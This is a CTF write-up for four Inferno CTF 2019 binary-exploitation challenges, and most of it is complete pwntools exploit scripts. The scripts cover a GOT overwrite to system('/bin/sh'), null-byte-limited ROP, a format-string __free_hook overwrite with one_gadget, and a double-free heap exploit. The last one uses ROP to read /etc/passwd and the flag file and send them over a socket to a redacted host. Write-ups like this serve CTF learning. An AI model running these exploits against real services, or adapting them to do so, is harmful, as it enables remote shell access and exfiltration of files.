---
date: 2019-12-30
linktitle: Inferno CTF 2019 - pwn Write Up
title: Inferno CTF 2019 - pwn Write Up
image : ""
categories:
- rev
- writeup
---


## bookstore
```
Description : I've been fascinated by the Earthsea Quartet since I was a child, so I would like I opened a bookstore to share Ursula Le Guin's with y'all. Care to have a look around?
server: nc 130.211.214.112 18012
file: bookstore
```

![](/img/inferno/bookstore1.png#mid)

I turned ASLR off when debugging, so that I could find address of `v5` easily. The only tricky part was finding which input could corrupt `v5` without any other function messing with our crafted input. After some debugging session, it turns out `puts` mess up the stack too much (`puts` is called every loop in main at `sub_40178B`). 

![](/img/inferno/bookstore2.png#float-right)

That means, the only way I could forge my pointer is on `sub_40122D()` calls right after the menu printed. Luckyly, the buffer to be passed into `atoi` is overlapping with `v5` later while adding a book to collection.

*TL;DR*, uninitialized variable
```py
#!/usr/bin/env python
from pwn import *

# context.arch = "amd64"
context.log_level = "debug" # debug, info, warn
context.terminal = ["tmux", "splitw", "-h"]

BINARY = "./bookstore"
HOST = "130.211.214.112"
PORT = 18012

# elf = ELF(BINARY, checksec=False)
uu64 = lambda x: u64(x.ljust(8, "\x00"))
uu32 = lambda x: u32(x.ljust(4, "\x00"))

gdbscript = '''
b *0x4018A3
b *0x401370
b *0x40144B
# b *0x401250
'''

def attach(r):
    if type(r) == process:
        gdb.attach(r, gdbscript)

def add(name, year, target):
    r.sendafter(' : ', '1'.ljust(8, '\x00') + p64(target))
    r.sendafter('? ', name)
    r.sendafter('? ', str(year))

def delete(name, year, idx):
    r.sendafter(' : ', '2')
    r.sendafter('? ', name)
    r.sendafter('? ', str(year))
    r.sendafter('? ', str(idx))

def update(name, year, desc=None):
    r.sendafter(' : ', '3')
    r.sendafter('? ', name)
    r.sendafter('? ', str(year))
    if desc != None:
        r.sendafter(': ', desc)

def show():
    r.sendafter(' : ', '4')
    res = []
    r.recvuntil(' 0 : ', 1)
    for i in range(1, 20):
        res.append(r.recvuntil('\n\n{:2d} : '.format(i), 1).split('\n     '))
    res.append(r.recvuntil('\n\n           Action List', 1).split('\n     '))
    return res

def exploit():
    attach(r)
    add('circleous', 0x1337, 0x403fb0)
    res = show()
    leak = res[0][2]
    print('puts %x' % uu64(leak))
    libc.address = uu64(leak) - libc.sym['puts']
    print('libc %x' % libc.address)

    payload = p64(libc.sym['puts'])
    payload+= p64(libc.sym['system'])
    update('\x00', 0, payload) # override strlen()
    
    add('/bin/sh\x00', 123, 0)

if __name__ == '__main__':
    if len(sys.argv) > 1:
        r = remote(HOST, PORT)
        libc = ELF('./libc64_2.29.so', checksec=0)
    else:
        r = process(BINARY, aslr=0)
        libc = ELF('/opt/glibc/x64/2.29/lib/libc.so.6', checksec=0)

    exploit()
    r.interactive()
```

## treat
```
Description: We sell all kinds of treat here, would you care to try our flagship coffee? p.s. It is not only delicious, but also environment friendly.
server: nc 130.211.214.112 18010
file: treat
```

![](/img/inferno/treat1.png)

Buffer overflow with a twist, `\x00` or `\n` as the end of input and the buffer is padded with zeroes to next multiply of 8. `\x00` as end of input is limiting us to place input as pointer once at a time since the pointer is 64bit wide and it'll obviously contains null byte since the pointer isn't really taking all the 64bit space.
The trick is you could forge ROP backward instead of the usual `p64(poprdi)+p64(binsh)+p64(system)` and placing a pointer once at a time every user input.

kinda Visualized,
```
"A" * 0x28 + p64(0xdeadbeef)
00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000020  41 41 41 41 41 41 41 41  00 00 00 00 de ad be ef  |AAAAAAAA........|
```
```
"A" * 0x20 + p64(0x13371337)
00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000020  00 00 00 00 13 37 13 37  00 00 00 00 de ad be ef  |................|
```
... and so on, the full exploit,

```py
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug" # debug, info, warn


exe = ELF("treat")
p = remote('130.211.214.112' ,18010)
# p = process('./treat')

### stack pivot, prepare rbp at bss+0x7B0

p.sendlineafter(': ',  'AAAA')

junk = '1'*72
junk += p32(0x4012c8)[:3] # main+4
p.sendlineafter(': ', junk)

junk = '1'*64
junk += p32(0x405810)[:3] # rbp
p.sendlineafter(': ', junk)

### ROP to system("/bin/sh")

junk = '/bin/sh;'
junk += 'A' * 0x7a0
junk += p32(exe.plt['system'])[:3] # system("/bin/sh;AAAA...")
p.sendlineafter(': ', junk)

junk = '1'*0x50
junk += p32(0x405080)[:3] # "/bin/sh;" from name
p.sendlineafter(': ', junk)

junk = '1'*0x48
junk += p32(0x4016a3)[:3] # pop rdi; ret
p.sendlineafter(': ', junk)

p.interactive()
```

## helloworld
```
Description: A simple AI to greet the customers :chuckles:
server: nc 130.211.214.112 18016
file: ld.so, libc.so, helloworld
```

![](/img/inferno/helloworld1.png#float-right)

2 shot try format string with `exit(0)` at the end. Given ld.so and libc.so and if you've solved `3x17` from [pwnable.tw](https://pwnable.tw/), you should know where this challange will go. Here, there's another bug that could be used. Did you notice the `i` in for loop is signed? You coud change this to some negative number and gain more loop to format string. Then change `__free_hook` or `__malloc_hook` to `one_gadget` and call `printf("%65537c")` to get `malloc`/`free` called, [more info about this](https://code.woboq.org/userspace/glibc/stdio-common/vfprintf-internal.c.html#1665).

```py
#!/usr/bin/env python
from pwn import *

# context.arch = "amd64"
# context.log_level = "debug" # debug, info, warn
context.terminal = ["tmux", "splitw", "-h"]

BINARY = "./helloworld"
HOST = "130.211.214.112"
PORT = 18016

# elf = ELF(BINARY, checksec=False)
uu64 = lambda x: u64(x.ljust(8, "\x00"))
uu32 = lambda x: u32(x.ljust(4, "\x00"))

gdbscript = '''
brva 0x127D
'''

def hex2int(x):
    return int(x, 16)

def attach(r):
    if type(r) == process:
        gdb.attach(r, gdbscript)

def write8(addr, n):
    payload = '%{}c%11$hhn'.format((n & 0xFF) + 0x100)
    payload = payload.ljust(0x18, 'A')
    payload += p64(addr)
    r.send(payload)
    r.recv()

def write16(addr, n):
    payload = '%{}c%11$hhn'.format((n & 0xFFFF) + 0x10000)
    payload = payload.ljust(0x18, 'A')
    payload += p64(addr)
    r.send(payload)
    r.recv()

def write64(addr, n, b=8):
    if b == 8:
        for _ in range(8):
            write8(addr, n)
            n >>= 8
            addr += 1
    elif b == 16:
        for _ in range(64/16):
            write16(addr, n)
            n >>= 16
            addr += 1

def exploit():
    payload  = '%12$p;%14$p;%15$p\n\x00'
    r.sendafter('? ', payload)
    r.recvuntil(', ')
    
    stack, pie, __libc_start_main_ret = map(hex2int, r.recvline(0).split(';'))
    stack -= 0x114
    pie -= 0x12b0
    libc.address = __libc_start_main_ret - libc.sym['__libc_start_main'] - 0xF3
    
    info('stack %x' % stack)
    info('pie %x' % pie)
    info('libc %x' % libc.address)

    payload = '%16777215c%11$n'
    payload = payload.ljust(0x18, 'A')
    payload += p64(stack + 1)
    r.sendafter('? ', payload)

    # 0xc9cfa execve("/bin/sh", r12, r13)
    # constraints:
    #   [r12] == NULL || r12 == NULL
    #   [r13] == NULL || r13 == NULL

    # 0xc9cfd execve("/bin/sh", r12, rdx)
    # constraints:
    #   [r12] == NULL || r12 == NULL
    #   [rdx] == NULL || rdx == NULL

    # 0xc9d00 execve("/bin/sh", rsi, rdx)
    # constraints:
    #   [rsi] == NULL || rsi == NULL
    #   [rdx] == NULL || rdx == NULL

    # 0xe7e2b execve("/bin/sh", rsp+0x60, environ)
    # constraints:
    #   [rsp+0x60] == NULL
    one_gadget = libc.address + 0xe7e2b
    write64(libc.sym['__free_hook'], one_gadget)
    r.send('%65537c')

if __name__ == '__main__':
    if len(sys.argv) > 1:
        r = remote(HOST, PORT)
        libc = ELF('libc64_2.29.so', checksec=0)
    else:
        r = process(BINARY, aslr=0)
        libc = ELF('/usr/lib/libc-2.30.so', checksec=0)

    attach(r)
    exploit()
    r.interactive()
```

## wheel of fortune
`redacted`

## secret keeper v2

```c
void sub_1447() // leak, stdout closed
{
  printf("You asked for secret of ");
  write(1, ptr->secret, ptr->secret_len);
  puts("\nPeeking at secrets is not good\n");
  fclose(stdout);
}

void sub_149F() // double free?
{
  memset(ptr->secret, 0, ptr->name_len);
  free(ptr->secret);
  memset(ptr->name, 0, ptr->secret_len);
  free(ptr->name);
  memset(ptr, 0, 0x18uLL);
  free(ptr);
}

void sub_153F() // buffer overflow, stdin closed
{
  char dest[0x2700];

  puts("Spilling secrets is not good\n");
  fclose(stdin);
  memcpy(&dest, ptr->name, ptr->secret_len);
  memset(ptr->secret, 0, ptr->name_len);
  memset(ptr->name, 0, ptr->secret_len);
}
```

- double free in `destroy some secret`
- libc leak from unsortedbins
- `stdout` closed right after getting leak
- `stdin` closed right after buffer overflowed
- partial overwrite RBP, get RSP to our nopsled rop (4bit bruteforce)
- ROP getdents+orw with socket+connect to extract the flag

I didn't solve this while CTF is still running since the remote server has really low success rate.

```py
#!/usr/bin/env python
from pwn import *

context.arch = "amd64"
# context.log_level = "debug" # debug, info, warn
context.terminal = ["tmux", "splitw", "-h"]

BINARY = "./secret_keeper_v2"
HOST = "130.211.214.112"
PORT = 18006

# elf = ELF(BINARY, checksec=False)
uu64 = lambda x: u64(x.ljust(8, "\x00"))
uu32 = lambda x: u32(x.ljust(4, "\x00"))

gdbscript = '''
brva 0x1677
# brva 0x15da
'''

def attach(r):
    if type(r) == process:
        gdb.attach(r, gdbscript)

# 0x000000000003d780: pop rax; ret; 
# 0x00000000000268a2: pop rdi; ret;
# 0x0000000000026dc9: pop rsi; ret; 
# 0x000000000002e1ba: pop rdx; ret; 
# 0x000000000011cb6e: mov qword ptr [rdi], rax; ret; 
# 0x00000000000b8ac9: syscall; ret; 
# 0x000000000003124f: nop; ret; 

def write64(addr, n):
    payload  = p64(libc.address + 0x000000000003d780)
    payload += p64(n)
    payload += p64(libc.address + 0x00000000000268a2)
    payload += p64(addr)
    payload += p64(libc.address + 0x000000000011cb6e)
    return payload

def write_str(addr, data):
    payload  = ''
    data_split = [data[i:i+8] for i in range(0, len(data), 8)]
    for d in data_split:
        payload += write64(addr, uu64(d))
        addr += 8
    return payload

def syscall(rax=None, rdi=None, rsi=None, rdx=None):
    if rax != None:
        payload  = p64(libc.address + 0x000000000003d780)
        payload += p64(rax)
    if rdi != None:
        payload += p64(libc.address + 0x00000000000268a2)
        payload += p64(rdi)
    if rsi != None:
        payload += p64(libc.address + 0x0000000000026dc9)
        payload += p64(rsi)
    if rdx != None:
        payload += p64(libc.address + 0x000000000002e1ba)
        payload += p64(rdx)
    payload += p64(libc.address + 0x00000000000b8ac9)
    return payload

def exploit():
    attach(r)

    r.sendafter('Exit               \n', '1\x00')
    r.sendafter('? ', '1280')
    r.sendafter(': ','asdaasdasdasdsdasd\n')
    r.sendafter('? ', '128')
    r.sendafter(': ','asdaasdasdasdsdasd\n')

    # double free
    r.sendafter('Exit               \n', '3\x00')
    r.sendafter('Exit               \n', '3\x00')

    # leak libc, heap
    r.sendafter('Exit               \n', '2\x00')
    r.recvuntil('of ')
    res = r.recvuntil('\nPeeking', 1)
    leak = res[0x270:0x278]
    libc.address = 0
    libc.address = uu64(leak) - 0x1bcb00
    heap = uu64(res[0x8:0x10]) - 0x10
    
    if libc.address < 0:
        return
    
    print('libc %x' % libc.address)
    print('heap %x' % heap)

    # gdb.attach(r, 'b *{}'.format(libc.address + 0x000000000003124f))
    
    # one shot rop
    r.send('1\x00\x00\x00')
    r.send(str(0x2702))
    
    # here lies home grown rop, heap here is just use for rw page
    rop1  = ''
    rop1 += write_str(heap, '/etc/passwd\x00')
    rop1 += write_str(heap + 0x20, '/home/ctf/\x00') # placeholder
    rop1 += write_str(heap + 0x40, '/home/ctf/flag.txt\x00') # placeholder
    rop1 += write_str(heap + 0x100, 'REDACTED') # connect struct

    # pwntools
    rop = ROP(libc)
    # first pass rop, getting user
    rop.open(heap, 0, 0) # /etc/passwd
    rop.socket(2, 1, 0)
    rop.connect(1, heap + 0x100, 16)
    rop.read(0, heap + 0x1000, 0x1000) # /etc/passwd fd
    rop.write(1, heap + 0x1000, 0x1000) # socketfd
    # second pass rop, getting directory list
    # rop.open(heap, 0, 0) # /home/user/
    # rop.socket(2, 1, 0)
    # rop.connect(1, heap + 20, 16)
    # rop.getdents(0, heap + 0x1000, 0x1000) # dirfd
    # rop.write(1, heap + 0x1000, 0x1000) # socketfd
    # third pass rop, get the flag
    # rop.open(heap, 0, 0) # /home/user/flag.txt
    # rop.socket(2, 1, 0)
    # rop.connect(1, heap + 0x40, 16)
    # rop.read(0, heap + 0x1000, 0x1000) # flag fd
    # rop.write(1, heap + 0x1000, 0x1000) # socketfd

    # nopsled padding
    payload  = p64(libc.address + 0x000000000003124f) * ((0x2400-len(str(rop))-len(rop1))//8) # nopsled
    payload += str(rop1) # call our home grown rop first
    payload += str(rop) # call socket+connect rop

    # partial overwrite rbp, hope it'll hit
    payload = payload.ljust(0x2700, '\x00')
    payload += p16(0x4000)
    r.send(payload)

    r.send('70\x00\x00')
    r.send('A' * 70)

    # fire
    r.send('4\n')

    # wait for connection
    # r.interactive()

if __name__ == '__main__':
    libc = ELF('./libc.so.6', checksec=0)
    while True:
        try:
            r = remote(HOST, PORT)
            # r = process(BINARY, aslr=1)
        except:
            continue
        exploit()
        r.close()
        # sleep(0.5)
```
